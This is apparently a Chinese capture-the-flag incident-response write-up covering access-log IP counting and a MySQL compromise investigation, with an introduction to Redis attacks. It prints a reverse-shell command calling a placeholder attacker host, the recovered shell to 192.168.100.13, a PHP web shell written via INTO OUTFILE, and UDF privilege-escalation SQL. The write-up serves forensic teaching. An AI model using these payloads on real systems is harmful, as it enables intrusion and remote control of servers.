+<p>先使用 cat 命令读取整个文件 access.log.1，然后将内容通过管道传递给 grep 进行搜索。</p>
+<p>后续步骤与上一个命令相同。</p>
+<ul>
+<li>主要区别</li>
+</ul>
+<p>使用 cat：第一条命令直接使用 grep 读取文件，避免了 cat 的额外步骤，更加简洁高效。<br>不使用 cat：第二条命令多了一步 cat，从功能上讲没有必要，因为 grep 可以直接读取文件内容。<br><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421165605174.png" alt="image-20250421165605174"></p>
+<p>最终就是6555次，提交flag就行</p>
+<h3 id="问题5：查看2023年8月03日8时这一个小时内有多少IP访问"><a href="#问题5：查看2023年8月03日8时这一个小时内有多少IP访问" class="headerlink" title="问题5：查看2023年8月03日8时这一个小时内有多少IP访问"></a>问题5：查看2023年8月03日8时这一个小时内有多少IP访问</h3><p>这里的话是具体到时间段了；</p>
+<p>首先我们得先把日期换成日志里的格式<strong>2023年8月03日8时——03&#x2F;Aug&#x2F;2023:08:</strong></p>
+<h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>还是一样的三个命令</p>
+<h5 id="第一种命令-1"><a href="#第一种命令-1" class="headerlink" title="第一种命令"></a>第一种命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27;| sort -nr| uniq -c|wc -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421170314021.png" alt="image-20250421170314021"></p>
+<h5 id="第二种命令-1"><a href="#第二种命令-1" class="headerlink" title="第二种命令"></a>第二种命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27;| sort -nr| uniq -c</span><br></pre></td></tr></table></figure>
+
+<p>这里细心的人就会发现了，哎，怎么这个和上面就少一个wc -l啊？</p>
+<p><strong>区别在于；</strong>（看需要加与不加）</p>
+<ul>
+<li>**不加 <code>wc -l</code>**：显示每个 IP 地址的访问次数。</li>
+<li>**加上 <code>wc -l</code>**：显示不同 IP 地址的总数量。</li>
+</ul>
+<h5 id="第三种命令"><a href="#第三种命令" class="headerlink" title="第三种命令"></a>第三种命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep “03/Aug/2023:08:” access.log.1 | awk ‘&#123;print $1&#125;’ | sort -nr | uniq -c | wc -l</span><br></pre></td></tr></table></figure>
+
+<p>命令其实都大差不差，主要的步骤就是</p>
+<ol>
+<li>从日志文件中筛选特定时间段的日志行。</li>
+<li>提取 IP 地址。</li>
+<li>对 IP 地址进行排序。</li>
+<li>统计每个 IP 地址的出现次数。</li>
+<li>计算不同 IP 地址的数量。</li>
+</ol>
+<p>这里只写了一个命令的示范，剩下的就自己去实践了哈</p>
+<h2 id="第二章日志分析-mysql应急响应"><a href="#第二章日志分析-mysql应急响应" class="headerlink" title="第二章日志分析-mysql应急响应"></a>第二章日志分析-mysql应急响应</h2><h3 id="什么是mysql"><a href="#什么是mysql" class="headerlink" title="什么是mysql"></a>什么是mysql</h3><p>MySQL 是一种开源关系型数据库管理系统（RDBMS），通常用于存储和管理数据。以下是关于 MySQL 的一些关键点：</p>
+<p>基本概念</p>
+<ul>
+<li><strong>关系型数据库管理系统</strong>：<ul>
+<li>MySQL 使用表格来存储数据，这些表可以通过关系进行关联。关系型数据库的结构化查询语言（SQL）用于定义、查询、和管理数据。</li>
+</ul>
+</li>
+<li><strong>开源软件</strong>：<ul>
+<li>MySQL 是开源的，意味着它的源代码是公开的，用户可以自由使用、修改和分发。MySQL 也是 Oracle 公司的一部分。</li>
+</ul>
+</li>
+</ul>
+<h3 id="什么是mysql应急响应"><a href="#什么是mysql应急响应" class="headerlink" title="什么是mysql应急响应"></a>什么是mysql应急响应</h3><p><strong>MySQL应急响应是指在MySQL数据库遇到故障、入侵或其他紧急情况时，采取的一系列快速、有效的措施，以确保数据库的完整性、安全性和可用性，这里我们主要分析的是日志信息，里面记录黑客入侵的大部份信息。</strong></p>
+<h3 id="问题1：黑客第一次写入的shell"><a href="#问题1：黑客第一次写入的shell" class="headerlink" title="问题1：黑客第一次写入的shell"></a>问题1：黑客第一次写入的shell</h3><p>看到这个的话，很难不想到第一章里面的webshell查杀的内容，我们这里就不赘述了，需要的师傅可以直接去第一章中查看</p>
+<h4 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h4><p>我们先去&#x2F;var&#x2F;www&#x2F;html里面的看看有没有吗，为什么呢</p>
+<p>因为既然黑客要在mysql里写入shell，那么首先他一定是先拿下了网站，并上传了shell，第一次写入的shell，我们可以去web目录下查找一番</p>
+<p>所以我们可以先在web目录里面收查一下</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117205810653.png" alt="image-20241117205810653"></p>
+<p>发现了一个.sh.php文件，我们cat看一下</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117205931629.png" alt="image-20241117205931629"></p>
+<p>从这个1 2 4能看出来是通过数据库注入写入的webshell, 注入点为表第三个字段<br>flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p>
+<h3 id="问题2-黑客反弹shell的ip"><a href="#问题2-黑客反弹shell的ip" class="headerlink" title="问题2:黑客反弹shell的ip"></a>问题2:黑客反弹shell的ip</h3><h5 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h5><p>反弹 Shell（Reverse Shell）是一种通过网络连接建立的 Shell 会话，通常用于远程控制计算机系统。在反弹 Shell 中，被攻击的机器主动向攻击者的机器发起连接，这与传统的“绑定 Shell”（Bind Shell）有区别，其中攻击者连接到目标机器上开放的端口。</p>
+<h5 id="反弹shell的原理"><a href="#反弹shell的原理" class="headerlink" title="反弹shell的原理"></a>反弹shell的原理</h5><p>反弹Shell（Reverse Shell）的原理是攻击者通过在目标系统上运行恶意代码，使得目标系统主动与攻击者的控制服务器建立连接，从而绕过防火墙和其他安全措施。</p>
+<p>反弹Shell的工作原理</p>
+<ul>
+<li>攻击者准备监听：攻击者在其控制的服务器上启动一个监听程序（通常是一个Netcat或类似工具），等待目标系统主动连接。</li>
+</ul>
+<p>nc -lvp 4444</p>
+<p>这里，-l表示监听模式，-v表示冗长输出，-p指定端口。</p>
+<ul>
+<li>目标系统执行恶意代码：攻击者通过漏洞利用、社交工程等手段，在目标系统上执行恶意代码。这段代码会打开一个Shell，并尝试连接攻击者的服务器。</li>
+</ul>
+<p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attacker_ip&#x2F;4444 0&gt;&amp;1</p>
+<p>这个命令的作用是通过TCP连接攻击者的IP地址和端口，并将输入和输出重定向到这个连接上。</p>
+<ul>
+<li><p>建立连接：目标系统主动向攻击者的服务器发起连接请求。由于是目标系统主动连接，一般不会被防火墙阻拦。</p>
+</li>
+<li><p>攻击者获得Shell访问：一旦连接建立，攻击者就可以在其控制服务器上得到一个远程Shell，能够像在本地终端一样执行命令，控制目标系统。</p>
+</li>
+</ul>
+<p>如果要找出黑客反弹的shell，我们就得从日志中进行分析了</p>
+<h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><ul>
+<li>检查日志文件：查看MySQL的日志文件，特别是查询日志和错误日志。这些日志可以提供关于执行的查询和任何异常情况的信息。</li>
+</ul>
+<p>查询日志：记录所有的查询，包括成功和失败的查询。<br>错误日志：记录MySQL服务器的错误、警告和通知。<br>这些日志通常位于&#x2F;var&#x2F;log&#x2F;mysql&#x2F;目录下。</p>
+<ul>
+<li><p>检查审计日志：如果启用了审计插件，可以查看审计日志。MySQL Enterprise Edition包含一个审计插件，可以记录所有SQL查询。</p>
+</li>
+<li><p>检查连接历史：检查MySQL中的连接历史，找出哪些IP地址连接过数据库。可以通过查询information_schema.processlist或performance_schema来获取连接信息。</p>
+</li>
+<li><p>检查特定的表和列：查找数据库中是否有存储和执行恶意命令的痕迹，例如system或exec等。</p>
+</li>
+</ul>
+<h4 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h4><p>所以我们先进入&#x2F;var&#x2F;log&#x2F;mysql&#x2F;目录，然后看看里面都有什么文件，发现只有一个error.log,我们查看这个文件后慢慢分析可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tmp/1.sh: line 1: --2023-08-01: command not found</span><br><span class="line">/tmp/1.sh: line 2: Connecting: command not found</span><br><span class="line">/tmp/1.sh: line 3: HTTP: command not found</span><br><span class="line">/tmp/1.sh: line 4: Length:: command not found</span><br><span class="line">/tmp/1.sh: line 5: Saving: command not found</span><br><span class="line">/tmp/1.sh: line 7: 0K: command not found</span><br><span class="line">/tmp/1.sh: line 9: syntax error near unexpected token `(&#x27;</span><br><span class="line">/tmp/1.sh: line 9: `2023-08-01 02:16:35 (5.01 MB/s) - &#x27;1.sh&#x27; saved [43/43]&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这段日志表明有人尝试在MySQL服务器上执行一个位于&#x2F;tmp&#x2F;1.sh的shell脚本，但是该脚本的内容并非有效的shell命令或脚本格式，而是看起来像HTTP响应或者是一个下载日志的内容。每行的错误信息，如command not found，指出脚本中的每一行都被解释器当作命令来尝试执行，但由于这些行实际上是HTTP响应的一部分（例如日期、状态信息、长度描述等），shell无法识别并执行它们，从而导致了一系列的错误。</p>
+<p>发现日志中 &#x2F;tmp&#x2F;1.sh 脚本的执行错误，发现后面也是由这个文件引起的一系列报错信息，那这里我们就可以尝试定位这个文件，看看里面到底是什么为什么会引起那么多报错信息；<br>find &#x2F; -name “1.sh”</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117211539930.png" alt="image-20241117211539930"></p>
+<p>发现在tmp目录也发现了这个文件，我们去看看</p>
+<p><strong><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117211713956.png" alt="image-20241117211713956"></strong></p>
+<p>这是一条反弹shell的命令</p>
+<p>命令解析</p>
+<ul>
+<li>bash -i：</li>
+</ul>
+<p>以交互模式启动一个新的Bash Shell。-i参数表示交互式Shell，这样可以确保Shell会读取并执行启动文件，如.bashrc。</p>
+<ul>
+<li>&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.100.13&#x2F;777：</li>
+</ul>
+<p>使用Bash的特殊文件重定向语法，通过TCP连接到IP地址192.168.100.13和端口777。</p>
+<p>&amp; 表示将标准输出（stdout）和标准错误（stderr）都重定向到 &#x2F;dev&#x2F;tcp&#x2F;192.168.100.13&#x2F;777，这个特殊文件实际上是在通过TCP连接发送数据。</p>
+<ul>
+<li>0&gt;&amp;1：</li>
+</ul>
+<p>将标准输入（stdin）重定向到标准输出（stdout），这样可以将所有输入从TCP连接中读取并执行。</p>
+<h3 id="问题3：黑客提权文件的完整路径"><a href="#问题3：黑客提权文件的完整路径" class="headerlink" title="问题3：黑客提权文件的完整路径"></a>问题3：黑客提权文件的完整路径</h3><p>在做这个题目之前，我们应该了解到<strong>在 MySQL 提权攻击中，最常用的一些方法包括利用 <code>INTO OUTFILE</code> 写入文件、利用 <code>LOAD_FILE</code> 读取文件，以及利用 UDF（用户定义函数）执行系统命令。这些方法因其简单高效、攻击面广而被广泛采用。</strong></p>
+<h4 id="三种mysql提权攻击"><a href="#三种mysql提权攻击" class="headerlink" title="三种mysql提权攻击"></a>三种mysql提权攻击</h4><ul>
+<li>利用 INTO OUTFILE 写入文件</li>
+</ul>
+<p>INTO OUTFILE 是 MySQL 提供的一个功能，允许将查询结果写入服务器上的文件。如果攻击者能成功利用这个功能，他们可以将恶意代码写入 Web 服务器目录，生成一个 Web Shell。</p>
+<p>示例：</p>
+<p>SELECT ‘<?php system($_GET["cmd"]); ?>‘ INTO OUTFILE ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’;</p>
+<p>这个命令将在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下创建一个名为 shell.php 的文件，包含一个简单的 Web Shell，攻击者可以通过访问该文件执行任意系统命令。</p>
+<ul>
+<li>利用 LOAD_FILE 读取文件</li>
+</ul>
+<p>LOAD_FILE 是 MySQL 提供的另一个功能，允许读取服务器上的文件内容。攻击者可以利用这个功能读取敏感文件，如系统密码文件 &#x2F;etc&#x2F;passwd。</p>
+<p>示例：</p>
+<p>SELECT LOAD_FILE(‘&#x2F;etc&#x2F;passwd’);</p>
+<p>这个命令会返回 &#x2F;etc&#x2F;passwd 文件的内容，其中包含所有用户的信息。</p>
+<ul>
+<li>利用 UDF 执行系统命令</li>
+</ul>
+<p>UDF（用户定义函数）允许用户扩展 MySQL 的功能。如果攻击者可以将恶意的共享库上传到服务器，他们可以利用 UDF 执行任意系统命令。</p>
+<p>示例步骤：</p>
+<p>上传恶意共享库 lib_mysqludf_sys.so 到 MySQL 服务器的插件目录。</p>
+<p>创建 UDF 函数：</p>
+<p>​	CREATE FUNCTION sys_exec RETURNS INTEGER SONAME ‘lib_mysqludf_sys.so’;</p>
+<p>使用 UDF 执行系统命令：</p>
+<p>​	SELECT sys_exec(‘id &gt; &#x2F;tmp&#x2F;output.txt’);</p>
+<p>这个命令将在 &#x2F;tmp 目录下创建一个文件 output.txt，其中包含执行 id 命令的结果。</p>
+<p><strong>常用方法总结</strong><br>INTO OUTFILE 写入文件：常用于创建 Web Shell 或写入恶意脚本。<br>LOAD_FILE 读取文件：常用于读取敏感文件，进行信息收集。<br>UDF 执行系统命令：常用于执行任意系统命令，获取更高权限。</p>
+<h4 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h4><p>那让我们来思考一下黑客进攻的流程，他做过反弹 shell 的操作，并且做过提权操作，既然是从数据库权限提权到主机用户权限，那肯定是通过数据库服务打过来的，既然黑客进行了提权，说明黑客肯定拿到了mysql账号和密码并且成功登录，那么我们可以猜想是否在web目录下有页面泄露账号密码</p>
+<p><strong>那我们这里直接跟进到目录&#x2F;var&#x2F;www&#x2F;html定位账号“root”看看我们能不能发现密码，也来验证一遍我们的猜想</strong></p>
+<p>find .&#x2F; -name “*.php” | xargs grep “root”</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117212910722.png" alt="image-20241117212910722"></p>
+<p>k可以看到进行了mysql的账号密码连接</p>
+<p>简单分析一下这段代码</p>
+<ul>
+<li><strong>localhost”</strong>：数据库服务器地址，这里是本地主机。</li>
+<li><strong>“root”</strong>：数据库用户名。</li>
+<li><strong>“334cc35b3c704593”</strong>：数据库密码。</li>
+<li><strong>“cms”</strong>：数据库名称。</li>
+<li><strong>“3306”</strong>：数据库端口号。</li>
+</ul>
+<p>然后我们也发现了是commom.php泄露的账号密码，我们就先连上数据库分析一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br></pre></td></tr></table></figure>
+
+<p>-u：用户<br>-p：密码</p>
+<p>连进去后就简单看一下数据库的设置，这样可以更好的知道黑客到底有没有进行UDF提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117213252122.png" alt="image-20241117213252122"></p>
+<p>简单分析一下；</p>
+<p><strong><code>show global variables like &#39;%secure%&#39;;</code> 是一条 MySQL 查询命令，用于显示与 “secure” 相关的全局变量及其当前设置。通过查看这些变量的配置，可以帮助我们了解 MySQL 服务器的安全性设置和限制。</strong></p>
+<p>zhi行命令后可能会有以下类似的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------+------------------------+</span><br><span class="line">| Variable_name              | Value                  |</span><br><span class="line">+----------------------------+------------------------+</span><br><span class="line">| require_secure_transport   | OFF                    |</span><br><span class="line">| secure_auth                | ON                     |</span><br><span class="line">| secure_file_priv           | /var/lib/mysql-files/  |</span><br><span class="line">+----------------------------+------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>这种的话进行分析就是</p>
+<p><strong>require_secure_transport: OFF</strong></p>
+<p>这个设置决定是 MySQL 是否要求使用安全传输层（如 SSL&#x2F;TLS）来保护客户端与服务器之间的通信。</p>
+<p><strong>secure_auth: ON</strong></p>
+<p>这个选项决定是否启用基于安全身份验证的 MySQL 客户端连接</p>
+<p><strong>secure_file_priv: &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;</strong></p>
+<p>这个设置指定 MySQL 服务器可以执行文件操作（如 LOAD DATA INFILE 和 SELECT INTO OUTFILE）的目录。<br>&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; 指定了一个受限的文件路径，简单来说就是 MySQL 只能从这个目录中加载文件或将数据导出到该目录，防止服务器访问不必要的文件路径，确实是提高了安全性。</p>
+<p>但是我们这secure_file_priv为空可能就是mysql没有对文件操作进行相应的限制，这会导致黑客可以利用UDF提权，因为他们可以任意的进行文件操作</p>
+<p>我们来了解一下什么是UDF提权</p>
+<h4 id="什么是-UDF-提权？"><a href="#什么是-UDF-提权？" class="headerlink" title="什么是 UDF 提权？"></a><strong>什么是 UDF 提权？</strong></h4><p>UDF 提权是利用 MySQL 的用户定义函数进行权限提升的攻击方法。攻击者可以编写恶意的 UDF 插件，并将其加载到 MySQL 中，从而执行系统级别的命令。</p>
+<p>使用过 MySQL 的人都知道，MySQL 有很多内置函数提供给使用者，包括字符串函数、数值函数、日期和时间函数等，给开发人员和使用者带来了很多方便。MySQL 的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对 MySQL 进行一些扩展，幸运的是，<strong>MySQL 给使用者提供了添加新函数的机制，这种使用者自行添加的 MySQL 函数就称为 UDF (User Define Function)。</strong></p>
+<h4 id="UDF-提权有哪些条件"><a href="#UDF-提权有哪些条件" class="headerlink" title="UDF 提权有哪些条件"></a>UDF 提权有哪些条件</h4><ul>
+<li>获取 mysql 控制权限：知道 mysql 用户名和密码，并且可以远程登录（即获取了 mysql 数据库的权限）</li>
+<li>mysql 具有写入文件的权限：mysql 有写入文件的权限，即 secure_file_priv 的值为空</li>
+</ul>
+<h4 id="什么情况下需要-UDF-提权"><a href="#什么情况下需要-UDF-提权" class="headerlink" title="什么情况下需要 UDF 提权"></a>什么情况下需要 UDF 提权</h4><ul>
+<li>拿到了 mysql 的权限，但是没拿到 mysql 所在服务器的任何权限，通过 mysql 提权，将 mysql 权限提升到操作系统权限</li>
+</ul>
+<p>所以到这里我们就可以确定黑客是利用UDF进行提权攻击的了，那么接下来我们该想想，如果是UDF提权的话，那么黑客会在哪里留下痕迹呢?</p>
+<ul>
+<li>在进行 UDF (User Defined Function) 提权时，攻击者通常会将恶意共享库文件放在 MySQL 插件目录中。这个目录的默认路径通常是 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;，&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; 目录是MySQL用来存放用户定义函数(UDF, User Defined Function)动态链接库文件的地方。一<strong>个名为udf.so的文件出现在此目录下，表明有人安装了一个自定义函数到MySQL服务器中。</strong>（一般来说就是这个目录，没人闲着会去移动）</li>
+</ul>
+<p>那为什么攻击者会使用 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; 目录？</p>
+<p>默认插件目录：</p>
+<p>&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; 是 MySQL 的默认插件目录，MySQL 有权限加载和执行该目录中的共享库文件。</p>
+<ul>
+<li>加载插件的需求：</li>
+</ul>
+<p>插件必须放置在 MySQL 的插件目录中，才能被 MySQL 识别和加载。攻击者通过将恶意 .so 文件放入该目录，实现提权。</p>
+<ul>
+<li>权限管理：</li>
+</ul>
+<p>由于 MySQL 服务运行时需要访问插件目录，通常该目录的权限设置相对宽松，允许 MySQL 服务有读写权限。<br>所以我们直接进入目录</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117214451735.png" alt="image-20241117214451735"></p>
+<p>这里可以看到有udf.so文件，所以黑客确实是通过UDF提权的</p>
+<p>直接把目录md5加密后提交flag就可以了</p>
+<p>扩展一下典型的UDF提权攻击</p>
+<h4 id="典型的-UDF-提权攻击步骤："><a href="#典型的-UDF-提权攻击步骤：" class="headerlink" title="典型的 UDF 提权攻击步骤："></a>典型的 UDF 提权攻击步骤：</h4><ul>
+<li><p>编写恶意 UDF 插件：攻击者编写一个 .so 文件，该文件包含恶意代码。</p>
+</li>
+<li><p>上传恶意插件：利用 MySQL 的文件操作功能将该文件上传到服务器上的某个路径。</p>
+</li>
+</ul>
+<p>SELECT ‘’ INTO OUTFILE ‘&#x2F;path&#x2F;to&#x2F;your&#x2F;udf.so’;</p>
+<ul>
+<li>创建 UDF 函数：使用 CREATE FUNCTION 命令将这个共享库文件加载为 MySQL 的 UDF 函数。</li>
+</ul>
+<p>CREATE FUNCTION do_system RETURNS INTEGER SONAME ‘udf.so’;</p>
+<ul>
+<li>执行命令：调用这个 UDF 函数执行系统命令。</li>
+</ul>
+<p>SELECT do_system(‘id’);</p>
+<h4 id="检查和防护UDF"><a href="#检查和防护UDF" class="headerlink" title="检查和防护UDF"></a>检查和防护UDF</h4><ul>
+<li>检查 UDF 函数：查看是否存在异常的 UDF 函数。</li>
+</ul>
+<p>SELECT * FROM mysql.func;</p>
+<ul>
+<li>限制 secure_file_priv：将 secure_file_priv 设置为一个特定的路径，限制 MySQL 文件操作的范围。</li>
+</ul>
+<p>secure_file_priv &#x3D; &#x2F;var&#x2F;lib&#x2F;mysql-files</p>
+<ul>
+<li>移除不需要的 UDF 函数：删除所有可疑的 UDF 函数。</li>
+</ul>
+<p>DROP FUNCTION IF EXISTS do_system;</p>
+<ul>
+<li><p>权限控制：严格控制数据库用户的权限，避免赋予不必要的权限，特别是文件操作和创建函数的权限。</p>
+</li>
+<li><p>日志监控：定期检查 MySQL 日志文件，关注异常的文件操作和函数创建活动。</p>
+</li>
+</ul>
+<h3 id="问题4-黑客获取的权限"><a href="#问题4-黑客获取的权限" class="headerlink" title="问题4:.黑客获取的权限"></a>问题4:.黑客获取的权限</h3><p>既然黑客已经获得了权限，那他肯定会在库中写下一些自定义函数，我们直接去库里面找一下新增的函数就可以了</p>
+<p>可以先查看一下进程</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117215044255.png" alt="image-20241117215044255"></p>
+<p>这里可以看到mysql服务是正在进行的，<strong>使用了指定的配置目录、数据目录和插件目录，发现目录就是UDF使用提取的目录，暂时也不是很确认，我们可以进入数据库进行分析进一步确认；</strong></p>
+<h4 id="UDF-提权的典型痕迹"><a href="#UDF-提权的典型痕迹" class="headerlink" title="UDF 提权的典型痕迹"></a>UDF 提权的典型痕迹</h4><ul>
+<li>异常的 .so 文件：（上面也有提到）</li>
+</ul>
+<p>检查这些目录下是否有最近创建的 .so 文件，特别是名字看起来可疑或不符合系统文件命名规范的文件。</p>
+<ul>
+<li>MySQL 日志：</li>
+</ul>
+<p>检查 MySQL 日志文件（如 mysql.log 或 error.log）中是否有异常的文件操作记录或 CREATE FUNCTION 语句。</p>
+<ul>
+<li>MySQL 函数表：</li>
+</ul>
+<p>检查 mysql.func 表中是否有异常的 UDF 函数。<br>SELECT * FROM mysql.func;<br>我们进入数据库，并使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM mysql.func;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以检查**<code>mysql.func</code> 表中是否有异常的 UDF 函数，同样这个表会查询到新增函数**</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117215455720.png" alt="image-20241117215455720"></p>
+<p>这里可以看到有一个sys_eval函数，<strong>所以sys_eval就是黑客新增的函数，接着题目让我们提交whoami后的值所以这里我们直接查询即可</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117215539631.png" alt="image-20241117215539631"></p>
+<ul>
+<li><strong><code>whoami</code> 命令</strong>：（题目要求）<ul>
+<li><code>whoami</code> 是一个 Unix&#x2F;Linux 命令，用于返回当前执行命令的用户名称。</li>
+<li>在 MySQL 中调用 <code>sys_eval(&#39;whoami&#39;)</code> 实际上是让 MySQL 服务器在操作系统上执行 <code>whoami</code> 命令，并返回结果。</li>
+<li>当 MySQL 执行 <code>select sys_eval(&#39;whoami&#39;);</code> 时，它调用 <code>UDF sys_eval</code>，传入参数 whoami。</li>
+<li>sys_eval 函数执行 whoami 命令，并捕获其输出。</li>
+<li>MySQL 返回 whoami 命令的输出，即运行 MySQL 服务器进程的用户名称。</li>
+</ul>
+</li>
+</ul>
+<h2 id="第二章日志分析-redis应急响应"><a href="#第二章日志分析-redis应急响应" class="headerlink" title="第二章日志分析-redis应急响应"></a>第二章日志分析-redis应急响应</h2><h3 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a><strong>什么是redis</strong></h3><p><strong>Redis 是一个开源的、内存中的数据结构存储系统，用作数据库、缓存和消息代理。它支持多种数据结构，如字符串、散列、列表、集合、有序集合、位图、HyperLogLogs 和地理空间索引半径查询</strong></p>
+<h3 id="关于Redis的攻击手法有"><a href="#关于Redis的攻击手法有" class="headerlink" title="关于Redis的攻击手法有"></a>关于Redis的攻击手法有</h3><ul>
+<li>未授权访问：</li>
+</ul>
+<p>缺乏身份验证：默认情况下，Redis 不要求身份验证，攻击者可以直接连接到 Redis 实例并执行任意命令。</p>
+<p>开放的网络接口：如果 Redis 监听在一个公共的 IP 地址上，攻击者可以通过网络远程访问 Redis 实例。</p>
+<ul>
+<li>远程代码执行：</li>
+</ul>
+<p>CONFIG 命令：攻击者可以利用未授权访问，通过 CONFIG 命令修改配置，例如设置 dir 和 dbfilename 来写入恶意文件，从而在目标服务器上执行代码。</p>
+<p>模块加载：Redis 允许加载自定义模块，如果没有进行适当的访问控制，攻击者可以加载恶意模块并执行任意代码。</p>
+<ul>
+<li>持久化攻击：</li>
+</ul>
+<p>持久化文件劫持：攻击者可以修改 Redis 的持久化配置（如 RDB 或 AOF 文件），然后写入恶意数据，当 Redis 重启时执行恶意操作。</p>
+<p>恶意数据注入：通过注入恶意数据到持久化文件中，攻击者可以在数据恢复时触发恶意行为。</p>
+<ul>
+<li>拒绝服务攻击（DoS）：</li>
+</ul>
+<p>资源耗尽：通过发送大量请求或存储大量数据，攻击者可以耗尽 Redis 服务器的内存或 CPU 资源，导致服务不可用。</p>
+<p>大键值操作：操作超大键值（如大列表或集合）可能会导致 Redis 性能下降，甚至崩溃。</p>
+<ul>
+<li>数据篡改和泄露：</li>
+</ul>
+<p>数据窃取：未经授权的访问可以导致敏感数据的泄露。<br>数据篡改：攻击者可以修改或删除关键数据，影响系统的正常运行。</p>
+<h3 id="Redis-的一些关键特性和用途："><a href="#Redis-的一些关键特性和用途：" class="headerlink" title="Redis 的一些关键特性和用途："></a>Redis 的一些关键特性和用途：</h3><p>关键特性：</p>
+<ul>
+<li>高性能：</li>
+</ul>
+<p>由于 Redis 是内存数据库，数据存储和读取的速度非常快。每秒可以执行数百万次操作。</p>
